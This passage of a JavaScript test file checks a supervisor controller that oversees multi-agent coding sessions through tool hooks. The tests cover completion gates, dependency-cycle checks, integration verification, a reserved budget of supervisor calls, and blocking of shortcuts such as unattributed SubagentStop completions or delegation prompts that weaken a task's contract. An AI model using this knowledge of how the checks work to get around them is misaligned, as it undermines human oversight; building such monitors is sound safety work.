  let calls = 0;
  const h = harness({
    semanticPatrolEvery: 2,
    maxSupervisorCalls: 3,
    supervisorHandler: () => { calls += 1; return { ok: true, verdict: {
      onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
    } }; },
  });
  h.store.saveState({ runtimeSupervisorCalls: 1 });
  h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_input: {}, transcript_path: h.transcript,
  } });
  h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(h.store.readState().semanticPatrols.main.toolBoundaries, 2,
    "the invalid TaskUpdate return is still on the patrol clock");
  assert.equal(calls, 0, "the last four calls remain available for Stop diagnosis and factual audits");
  assert.ok(h.store.events().some((event) => event.type
    === "semantic_patrol_skipped_for_completion_reserve"));
});

test("runtime interventions cannot consume the completion-only supervisor reserve", () => {
  const h = harness({ maxSupervisorCalls: 10 });
  h.store.saveState({ runtimeSupervisorCalls: 2 });
  const runtime = h.controller.consumeSupervisorCall("diagnosis", "runtime-intervention");
  assert.equal(runtime.ok, false);
  assert.equal(runtime.reservedForCompletion, 8);

  h.store.append("boundary_paused", {
    interventionId: "stop-intervention", boundary: "Stop", trigger: "coordination-incomplete",
  });
  const completion = h.controller.consumeSupervisorCall("diagnosis", "stop-intervention");
  assert.equal(completion.ok, true);
  assert.equal(completion.used, 3);
  assert.equal(h.store.readState().runtimeSupervisorCalls, 3);
});

test("an on-track periodic semantic patrol is silent and advances its durable cadence", () => {
  const h = harness({
    semanticPatrolEvery: 2,
    decide: () => ({ verdict: "allow", proposed: { action: "bash", irreversible: false } }),
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
    } }),
  });
  for (let index = 0; index < 2; index += 1) {
    const result = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Bash",
      tool_input: { command: "npm test" }, transcript_path: h.transcript,
    } });
    assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  }
  assert.equal(h.store.readState().semanticPatrols.main.lastPatrolAt, 2);
  assert.equal(h.store.readState().semanticPatrols.main.toolBoundaries, 2);
  assert.ok(h.store.events().some((event) => event.type === "semantic_patrol_passed"));
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
});

test("team task graph rejects dependency cycles and completion before dependencies", () => {
  const h = harness();
  for (const [id, subject] of [["t1", "build core"], ["t2", "wire adapter"]]) {
    h.controller.handleHook({ input: {
      hook_event_name: "TaskCreated", task_id: id, task_subject: subject,
      task_description: subject, teammate_name: "lead",
    } });
  }
  const firstUpdate = {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "t1", addBlockedBy: ["t2"], owner: "alice" },
    teammate_name: "lead",
  };
  h.controller.postTool({ input: firstUpdate });
  const cyclic = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "t2", addBlockedBy: ["t1"] }, teammate_name: "lead",
  } });
  assert.equal(cyclic.output.hookSpecificOutput.permissionDecision, "deny");
  assert.match(cyclic.output.hookSpecificOutput.permissionDecisionReason, /形成环/);

  const early = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "t1", task_subject: "build core",
    teammate_name: "alice",
  } });
  assert.equal(early.output._outsiderExitCode, 2);
  assert.match(early.output._outsiderStderr, /依赖仍未通过/);
  assert.equal(h.store.readState().tasks.t1.status, "pending");
});

test("an explicitly unfinished team graph gets a deterministic Stop continuation", () => {
  let supervisorCalls = 0;
  const h = harness({ supervisorHandler: () => {
    supervisorCalls += 1;
    return { ok: true, verdict: { onTrack: false, drift: "should not run", plan: [] } };
  } });
  h.controller.taskCreated({ input: { hook_event_name: "TaskCreated", task_id: "slice",
    task_subject: "slice", task_description: "slice", teammate_name: "lead" } });
  h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "slice", owner: "alice", status: "in_progress" },
    teammate_name: "lead", tool_response: { success: true } } });
  const stopped = h.controller.stop({ input: { hook_event_name: "Stop",
    teammate_name: "lead" } });
  assert.equal(stopped.output.decision, "block");
  assert.equal(supervisorCalls, 0);
  assert.match(stopped.output.reason, /slice\[owner=alice,status=in_progress\]/);
  const continuation = h.store.events().find((event) =>
    event.type === "coordination_continuation_emitted");
  assert.equal(continuation.authority, "deterministic-task-graph");
  assert.equal(continuation.modelCallUsed, false);
  assert.deepEqual(continuation.unfinished[0].blockedBy, []);
});

test("an intermediate teammate completion is judged from its bound slice rather than unfinished siblings", () => {
  let diagnosisPacket = null;
  let clearanceEvidence = null;
  const h = harness({
    supervisorHandler: ({ packet }) => {
      diagnosisPacket = packet;
      return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
      } };
    },
    clearanceAuditorHandler: ({ evidence }) => {
      clearanceEvidence = evidence;
      return { ok: true, verdict: {
        passed: true, errors: [], verifiedFacts: ["the owner's slice is independently ready"],
        notes: ["the sibling and integration tasks are intentionally still open"],
      } };
    },
  });
  for (const [id, owner] of [["slice-a", "alice"], ["slice-b", "bob"]]) {
    h.controller.taskCreated({ input: {
      hook_event_name: "TaskCreated", task_id: id, task_subject: id,
      task_description: `edit src/value.js and run npm test for ${id}`,
      teammate_name: "lead",
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
      tool_input: { taskId: id, owner, status: "in_progress" },
      tool_response: { success: true },
    } });
  }
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "integration", task_subject: "integration",
    task_description: "integrate both slices", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "integration", owner: "lead", addBlockedBy: ["slice-a", "slice-b"] },
    tool_response: { success: true },
  } });
  const edit = { hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "alice-edit",
    tool_input: { file_path: "src/value.js" }, teammate_name: "alice", task_id: "slice-a" };
  h.controller.preTool({ input: edit });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.postTool({ input: { ...edit, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const check = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "alice-test",
    tool_input: { command: "npm test" }, teammate_name: "alice", task_id: "slice-a" };
  h.controller.preTool({ input: check });
  h.controller.postTool({ input: { ...check, hook_event_name: "PostToolUse",
    tool_response: { success: true, exit_code: 0 } } });

  const completed = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "slice-a", task_subject: "slice-a",
    teammate_name: "alice",
  } });
  assert.equal(completed.output._outsiderExitCode, undefined);
  assert.equal(h.store.readState().tasks["slice-a"].status, "completed");
  assert.equal(h.store.readState().tasks["slice-b"].status, "in_progress");
  assert.equal(h.store.readState().tasks.integration.status, "pending");
  assert.equal(diagnosisPacket.decisionScope.kind, "intermediate-team-task-delivery");
  assert.equal(diagnosisPacket.decisionScope.taskId, "slice-a");
  assert.deepEqual(diagnosisPacket.decisionScope.actorEvidence.confirmedEffects
    .map((effect) => effect.file), ["src/value.js"]);
  assert.deepEqual(diagnosisPacket.decisionScope.actorEvidence.successfulChecks
    .map((entry) => entry.action), ["npm test"]);
  assert.equal(clearanceEvidence.decisionScope.globalIncompletenessExpected, true);
});

test("TaskCompleted audits the recorded host transaction before the matching TaskUpdate Post commits completion", () => {
  let diagnosisScope = null;
  let clearanceScope = null;
  const h = harness({
    supervisorHandler: ({ packet }) => {
      diagnosisScope = packet.decisionScope;
      assert.equal(diagnosisScope.gatePhase, "before-host-task-update-commit");
      assert.equal(diagnosisScope.taskStatus, "in_progress");
      assert.equal(diagnosisScope.taskStatusMustRemainUncommittedUntilThisGatePasses, true);
      assert.equal(diagnosisScope.completionIntent.recorded, true);
      assert.equal(diagnosisScope.completionIntent.taskId, "transaction-slice");
      assert.equal(diagnosisScope.completionIntent.agentId, "teammate:alice");
      return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
      } };
    },
    clearanceAuditorHandler: ({ evidence }) => {
      clearanceScope = evidence.decisionScope;
      assert.equal(clearanceScope.gatePhase, "before-host-task-update-commit");
      assert.equal(clearanceScope.completionIntent.recorded, true);
      assert.equal(clearanceScope.taskStatus, "in_progress");
      return { ok: true, verdict: {
        passed: true, errors: [],
        verifiedFacts: ["the slice effect and check are complete; host commit is intentionally pending"],
        notes: ["TaskUpdate PostToolUse is the commit point"],
      } };
    },
  });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "transaction-slice",
    task_subject: "transaction slice", task_description: "edit src/value.js and run npm test",
    teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "transaction-slice", owner: "alice", status: "in_progress" },
    tool_response: { success: true },
  } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "transaction-integration",
    task_subject: "integration", task_description: "integrate the slice", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "transaction-integration", owner: "lead",
      addBlockedBy: ["transaction-slice"] },
    tool_response: { success: true },
  } });
  const edit = {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "transaction-edit",
    tool_input: { file_path: "src/value.js" }, teammate_name: "alice",
    task_id: "transaction-slice",
  };
  h.controller.preTool({ input: edit });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.postTool({ input: { ...edit, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const check = {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "transaction-check",
    tool_input: { command: "npm test" }, teammate_name: "alice",
    task_id: "transaction-slice",
  };
  h.controller.preTool({ input: check });
  h.controller.postTool({ input: { ...check, hook_event_name: "PostToolUse",
    tool_response: { success: true, exit_code: 0 } } });

  const update = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_use_id: "transaction-complete",
    tool_input: { taskId: "transaction-slice", status: "completed" },
    teammate_name: "alice",
  };
  h.controller.preTool({ input: update });
  assert.equal(h.store.readState().tasks["transaction-slice"].status, "in_progress",
    "PreToolUse records intent but must not commit host state");
  const lifecycle = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "transaction-slice",
    task_subject: "transaction slice", teammate_name: "alice",
  } });
  assert.equal(lifecycle.output._outsiderExitCode, undefined);
  assert.equal(h.store.readState().tasks["transaction-slice"].status,
    "awaiting-host-completion-post");
  h.controller.postTool({ input: { ...update, hook_event_name: "PostToolUse",
    tool_response: { success: true, exit_code: 0 } } });
  assert.equal(h.store.readState().tasks["transaction-slice"].status, "completed");
  assert.ok(diagnosisScope && clearanceScope);
  const events = h.store.events();
  const intent = events.find((event) => event.type === "task_completion_intent_recorded"
    && event.taskId === "transaction-slice");
  const pending = events.find((event) => event.type === "task_completion_verified_pending_host"
    && event.taskId === "transaction-slice");
  const post = events.find((event) => event.type === "boundary_reached"
    && event.boundary === "PostToolUse" && event.toolUseId === "transaction-complete");
  const completed = events.find((event) => event.type === "team_task_completed"
    && event.taskId === "transaction-slice");
  assert.ok(intent.seq < pending.seq && pending.seq < post.seq && post.seq < completed.seq);
  assert.equal(completed.completionIntentHash, intent.completionIntentHash);
  assert.equal(completed.postHostSucceeded, true);
});

test("multi-agent coordination confirms file conflicts and gates the final task on integration", () => {
  let integrationCalls = 0;
  const h = harness({
    supervisorHandler: ({ packet }) => {
      if (String(packet.trigger).startsWith("multi-agent-integration:")) {
        integrationCalls += 1;
        assert.equal(packet.coordination.conflicts[0].file, "src/value.js");
        if (integrationCalls === 1) return { ok: true, verdict: {
          onTrack: false,
          drift: "两个 teammate 对同一核心文件作出了不兼容的局部假设",
          plan: ["统一 value 状态所有权并重新检查两个任务的组合行为"],
          expectedNextActions: ["edit:src/value.js"],
          acceptanceRisk: "局部任务绿灯不能证明组合正确",
        } };
      }
      return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
      } };
    },
  });
  for (const [id, owner] of [["t1", "alice"], ["t2", "bob"]]) {
    h.controller.taskCreated({ input: {
      hook_event_name: "TaskCreated", task_id: id, task_subject: `${id} slice`,
      task_description: `${id} implementation`, teammate_name: "lead",
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
      tool_input: { taskId: id, owner, status: "in_progress" }, teammate_name: "lead",
    } });
    const editInput = {
      hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: `edit-${id}`,
      tool_input: { file_path: "src/value.js" }, teammate_name: owner, task_id: id,
    };
    h.controller.preTool({ input: editInput });
    writeFileSync(path.join(h.cwd, "src", "value.js"),
      `export const value = ${owner === "alice" ? 2 : 3};\n`);
    h.controller.postTool({ input: { ...editInput, hook_event_name: "PostToolUse",
      tool_response: { success: true } } });
  }
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "integration", task_subject: "integrate team work",
    task_description: "verify the complete team graph", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "integration", owner: "lead", addBlockedBy: ["t1", "t2"] },
  } });
  assert.equal(Object.values(h.store.readState().fileConflicts).length, 1);

  const firstDone = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "t1", task_subject: "t1 slice",
    teammate_name: "alice",
  } });
  assert.equal(firstDone.output._outsiderExitCode, undefined);
  assert.equal(h.store.readState().tasks.t1.status, "completed");

  const secondDone = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "t2", task_subject: "t2 slice",
    teammate_name: "bob",
  } });
  assert.equal(secondDone.output._outsiderExitCode, undefined);
  const blockedMerge = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "integration", task_subject: "integrate team work",
    teammate_name: "lead",
  } });
  assert.equal(blockedMerge.output._outsiderExitCode, 2);
  assert.match(blockedMerge.output._outsiderStderr, /OUTSIDER_INTERVENTION:/);
  assert.equal(h.store.readState().tasks.integration.status, "integration-blocked");
  assert.equal(h.store.readState().tasks.integration.independentlyVerified, false);
  assert.equal(h.store.readState().tasks.integration.completedAt, null);

  const acceptedMerge = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "integration", task_subject: "integrate team work",
    teammate_name: "lead",
  } });
  assert.equal(acceptedMerge.output._outsiderExitCode, undefined);
  assert.equal(h.store.readState().tasks.t2.status, "completed");
  assert.equal(h.store.readState().tasks.integration.status, "completed");
  assert.equal(Object.values(h.store.readState().fileConflicts)[0].status,
    "resolved-by-integration");
  assert.ok(h.store.events().some((event) => event.type === "multi_agent_integration_blocked"));
  assert.ok(h.store.events().some((event) => event.type === "multi_agent_integration_verified"));
  const integrationCorrection = h.store.events().find((event) =>
    event.type === "correction_emitted" && event.channel === "TaskCompleted.exit2");
  assert.equal(integrationCorrection.channel, "TaskCompleted.exit2");
});

test("a conflict-free team still receives independent integration verification", () => {
  let integrationCalls = 0;
  const h = harness({
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" },
    ],
    supervisorHandler: ({ packet }) => {
      if (String(packet.trigger).startsWith("multi-agent-integration:")) {
        integrationCalls += 1;
        assert.equal(packet.trigger, "multi-agent-integration:conflict-free");
        assert.deepEqual(packet.coordination.conflicts, []);
      }
      return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
      } };
    },
  });
  for (const [id, owner, file] of [["store", "alice", "src/store.js"],
    ["scheduler", "bob", "src/scheduler.js"]]) {
    h.controller.taskCreated({ input: {
      hook_event_name: "TaskCreated", task_id: id, task_subject: `${id} slice`,
      task_description: `${id} implementation`, teammate_name: "lead",
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
      tool_input: { taskId: id, owner, status: "in_progress" }, teammate_name: "lead",
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "Edit",
      tool_input: { file_path: file }, teammate_name: owner, task_id: id,
    } });
  }
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "integration", task_subject: "integrate slices",
    task_description: "run whole-graph integration verification", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "integration", owner: "lead",
      addBlockedBy: ["store", "scheduler"] },
  } });
  h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "store", task_subject: "store slice",
    teammate_name: "alice",
  } });
  h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "scheduler", task_subject: "scheduler slice",
    teammate_name: "bob",
  } });
  const final = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "integration", task_subject: "integrate slices",
    teammate_name: "lead",
  } });
  assert.equal(final.output._outsiderExitCode, undefined);
  assert.equal(integrationCalls, 0,
    "green controller-owned integration evidence should not buy a redundant diagnosis call");
  const event = h.store.events().find((candidate) =>
    candidate.type === "multi_agent_integration_verified");
  assert.equal(event.conflictFree, true);
  assert.deepEqual(event.conflictIds, []);
  assert.equal(event.agentId, "teammate:lead");
  assert.equal(Number.isInteger(event.acceptanceSeq), true);
  assert.equal(Number.isInteger(event.acceptanceExit), true);
  assert.equal(typeof event.finalFingerprint, "string");
  assert.equal(Number.isInteger(event.outcomeVerdictSeq), true);
  assert.equal(Number.isInteger(event.approvalAuditSeq), true);
  assert.deepEqual(event.dependencyTaskIds, ["store", "scheduler"]);
  const integrationAcceptance = h.store.events().find((candidate) =>
    candidate.seq === event.acceptanceSeq);
  const integrationOutcome = h.store.events().find((candidate) =>
    candidate.seq === event.outcomeVerdictSeq);
  assert.equal(integrationAcceptance.phase, "integration");
  assert.equal(integrationAcceptance.passed, true);
  assert.equal(integrationOutcome.phase, "integration");
  assert.equal(integrationOutcome.passed, true);
  assert.equal(integrationOutcome.finalFingerprint, event.finalFingerprint);
});

test("integration acceptance red is corrected under one authority before the lead task can complete", () => {
  let integrationCalls = 0;
  const triggers = [];
  const h = harness({
    acceptanceResults: [
      { ran: true, passed: false, exit: 1, command: "node integration-test.mjs",
        output: "expected 42" },
      { ran: true, passed: true, exit: 0, command: "node integration-test.mjs",
        output: "integration passed" },
    ],
    supervisorHandler: ({ packet }) => {
      triggers.push(String(packet.trigger));
      if (String(packet.trigger).startsWith("multi-agent-integration:")) {
        integrationCalls += 1;
        if (integrationCalls === 1) return { ok: true, verdict: {
          onTrack: false,
          drift: "两个局部切片各自通过，但组合验收仍失败",
          plan: ["edit:src/value.js"],
          expectedNextActions: ["edit:src/value.js", "runRef:frozenAcceptance"],
          acceptanceRisk: "controller-owned integration acceptance is red",
        } };
      }
      return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
      } };
    },
  });
  h.controller.taskCreated({ input: { hook_event_name: "TaskCreated", task_id: "integration",
    task_subject: "integrate slices", task_description: "run integration acceptance",
    teammate_name: "lead" } });
  for (const [id, owner, file] of [["store", "alice", "src/store.js"],
    ["scheduler", "bob", "src/scheduler.js"]]) {
    h.controller.taskCreated({ input: { hook_event_name: "TaskCreated", task_id: id,
      task_subject: `${id} slice`, task_description: `${id} implementation`, teammate_name: "lead" } });
    h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
      tool_input: { taskId: id, owner, status: "in_progress" }, teammate_name: "lead" } });
    h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "Edit",
      tool_input: { file_path: file }, teammate_name: owner, task_id: id } });
    h.controller.taskCompleted({ input: { hook_event_name: "TaskCompleted", task_id: id,
      task_subject: `${id} slice`, teammate_name: owner } });
  }
  h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    teammate_name: "lead", tool_input: { taskId: "integration", owner: "lead",
      addBlockedBy: ["store", "scheduler"] } } });
  const first = h.controller.taskCompleted({ input: { hook_event_name: "TaskCompleted",
    task_id: "integration", task_subject: "integrate slices", teammate_name: "lead" } });
  assert.equal(first.output._outsiderExitCode, 2);
  assert.equal(triggers.includes("team-task-delivery:integration"), false,
    "the lead integration task must go directly to controller-owned integration acceptance");
  const correction = h.store.events().find((event) => event.type === "correction_emitted"
    && event.channel === "TaskCompleted.exit2");
  assert.ok(correction?.correctionAuthorityHash);
  assert.equal(h.store.readState().tasks.integration.status, "integration-blocked");
  assert.equal(h.store.readState().tasks.integration.independentlyVerified, false);
  assert.equal(h.store.readState().tasks.integration.completedAt, null);
  const open = h.store.readState().openInterventions["teammate:lead"];
  assert.equal(open.id, correction.interventionId);
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);
  const editInput = { hook_event_name: "PreToolUse", tool_name: "Edit",
    tool_use_id: "integration-repair", teammate_name: "lead",
    tool_input: { file_path: path.join(h.cwd, "src", "value.js") },
    transcript_path: h.transcript };
  h.controller.preTool({ input: editInput });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 42;\n");
  h.controller.postTool({ input: { ...editInput, hook_event_name: "PostToolUse",
    tool_response: { success: true, exit_code: 0 } } });
  h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    teammate_name: "lead", tool_input: { taskId: "integration", status: "in_progress" },
    tool_response: { success: true } } });
  const second = h.controller.taskCompleted({ input: { hook_event_name: "TaskCompleted",
    task_id: "integration", task_subject: "integrate slices", teammate_name: "lead" } });
  assert.equal(second.output._outsiderExitCode, undefined);
  const verified = [...h.store.events()].reverse().find((event) =>
    event.type === "multi_agent_integration_verified");
  assert.equal(verified.interventionId, correction.interventionId);
  assert.equal(verified.correctionAuthorityHash, correction.correctionAuthorityHash);
  assert.equal(verified.acceptanceExit, 0);
  assert.equal(Number.isInteger(verified.approvalAuditSeq), true);
});

test("a worker-owned final task cannot claim multi-agent integration authority", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "worker-final", task_subject: "worker slice",
    task_description: "worker-local work", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "worker-final", owner: "alice", status: "in_progress" },
  } });
  const result = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "worker-final", task_subject: "worker slice",
    teammate_name: "alice",
  } });
  assert.equal(result.output._outsiderExitCode, 2);
  assert.match(result.output._outsiderStderr, /lead\/main/);
  assert.equal(h.store.events().some((event) =>
    event.type === "multi_agent_integration_verified"), false);
  const rejected = h.store.events().find((event) =>
    event.type === "multi_agent_integration_authority_rejected");
  assert.equal(rejected.agentId, "teammate:alice");
  assert.equal(rejected.latestOwner, "alice");
});

test("TeammateIdle is turned into autonomous redirection instead of waking the operator", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "idle-task", task_subject: "finish adapter",
    task_description: "finish adapter", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "idle-task", owner: "alice", status: "in_progress" },
    teammate_name: "lead",
  } });
  const result = h.controller.teammateIdle({ input: {
    hook_event_name: "TeammateIdle", teammate_name: "alice",
  } });
  assert.equal(result.output._outsiderExitCode, 2);
  assert.match(result.output._outsiderStderr, /请完成并通过 TaskCompleted 门/);
  assert.ok(h.store.events().some((event) => event.type === "teammate_idle_blocked"));
});

test("a true teammate cannot use SubagentStop as an unattributed completion shortcut", () => {
  let supervisorCalls = 0;
  const h = harness({ supervisorHandler: () => {
    supervisorCalls += 1;
    return { ok: true, verdict: {
      onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
    } };
  } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "owned-stop", task_subject: "owned slice",
    task_description: "edit the owned slice", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "owned-stop", owner: "alice", status: "in_progress" },
    tool_response: { success: true }, teammate_name: "lead",
  } });
  const stopped = h.controller.subagentStop({ input: {
    hook_event_name: "SubagentStop", teammate_name: "alice", task_id: "owned-stop",
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /TaskUpdate\(taskId=owned-stop, status=completed\)/);
  assert.equal(supervisorCalls, 0, "protocol enforcement must not buy another LLM opinion");
  assert.notEqual(h.store.readState().tasks["owned-stop"].status, "completed");
  assert.equal(h.store.events().some((event) => event.type === "task_completed"), false);
  const required = h.store.events().find((event) =>
    event.type === "teammate_completion_protocol_required");
  assert.equal(required.channel, "SubagentStop.exit2");
});

test("Agent Team lifecycle identity continues across unnamed tool hooks and injects the frozen contract once", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "owned", task_subject: "implement owned slice",
    task_description: "change src/value.js without weakening the public contract",
    teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "owned", owner: "alice", status: "in_progress" },
    teammate_name: "lead",
  } });
  const teammateTranscript = path.join(h.cwd, "team", "alice.jsonl");
  const lifecycle = {
    hook_event_name: "TeammateIdle", teammate_name: "alice",
    session_id: "agent-team-session-alice", transcript_path: teammateTranscript,
  };
  h.controller.teammateIdle({ input: lifecycle });

  const unnamed = {
    hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" }, tool_use_id: "tool-alice-1",
    session_id: lifecycle.session_id, transcript_path: teammateTranscript,
  };
  const first = h.controller.preTool({ input: unnamed });
  assert.equal(first.output.hookSpecificOutput.permissionDecision, "allow");
  assert.match(first.output.hookSpecificOutput.additionalContext, /冻结工作合同/);
  assert.match(first.output.hookSpecificOutput.additionalContext, /change src\/value\.js/);
  const second = h.controller.preTool({ input: { ...unnamed, tool_use_id: "tool-alice-2" } });
  assert.equal(second.output.hookSpecificOutput.additionalContext, undefined,
    "the teammate receives the frozen contract once, not on every tool boundary");

  const editInput = {
    ...unnamed, hook_event_name: "PreToolUse", tool_name: "Edit",
    tool_input: { file_path: "src/value.js" }, tool_use_id: "tool-alice-3",
  };
  h.controller.preTool({ input: editInput });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.postTool({ input: { ...editInput, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const events = h.store.events();
  const registered = events.find((event) => event.type === "agent_registered"
    && event.agentId === "teammate:alice");
  assert.equal(registered.agentKind, "teammate");
  assert.equal(registered.identitySource, "lifecycle-teammate-name");
  assert.match(registered.identityProvenanceHash, /^sha256:/);
  const injected = events.filter((event) => event.type === "teammate_context_injected"
    && event.agentId === "teammate:alice");
  assert.equal(injected.length, 1);
  assert.ok(registered.lineageHashes.some((lineage) =>
    lineage.hash === injected[0].identityLineageHash));
  assert.ok(events.some((event) => event.type === "confirmed_file_touch"
    && event.agentId === "teammate:alice" && event.file === "src/value.js"));
  const serializedLineage = JSON.stringify(h.store.readState().agentIdentityLineages);
  assert.doesNotMatch(serializedLineage, /agent-team-session-alice|alice\.jsonl/,
    "raw host identity material is not persisted in the lineage index");
});

test("named Agent delegation is bound byte-for-byte to the frozen shared task before spawn", () => {
  const h = harness();
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "scheduler-task",
    task_subject: "scheduler slice",
    task_description: "Implement nextJob(jobs, tenant); tenant filtering belongs in this function.",
    teammate_name: "lead",
  } });
  const owner = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "own-scheduler",
    tool_input: { taskId: "scheduler-task", owner: "scheduler-owner", status: "in_progress" },
    teammate_name: "lead",
  };
  h.controller.preTool({ input: owner });
  h.controller.postTool({ input: { ...owner, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });

  const spawn = {
    hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: "spawn-scheduler",
    tool_input: { name: "scheduler-owner",
      prompt: "Implement nextJob(jobs); the caller already filters tenant." },
  };
  const denied = h.controller.preTool({ input: spawn });
  assert.equal(denied.output.hookSpecificOutput.permissionDecision, "deny");
  assert.match(denied.output.hookSpecificOutput.additionalContext,
    /Implement nextJob\(jobs, tenant\)/);
  assert.equal(h.store.events().some((event) => event.type === "task_delegated"), false);
  assert.equal(h.store.events().some((event) => event.type === "team_spawn_requested"), false);

  const correction = denied.output.hookSpecificOutput.additionalContext;
